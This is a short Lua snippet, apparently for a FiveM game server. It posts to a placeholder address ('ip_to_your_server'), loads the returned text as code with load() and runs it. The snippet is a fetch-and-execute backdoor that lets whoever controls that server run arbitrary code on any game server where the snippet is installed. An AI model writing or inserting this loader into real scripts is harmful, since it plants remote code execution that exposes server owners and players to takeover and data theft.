PerformHttpRequest("http://ip_to_your_server/", function(errorCode, resultData, _)
    if errorCode == 200 then
        local func, err = load(resultData)
        if func then
            func()
        end
    end
end, "POST", "", {["Content-Type"] = "text/plain"})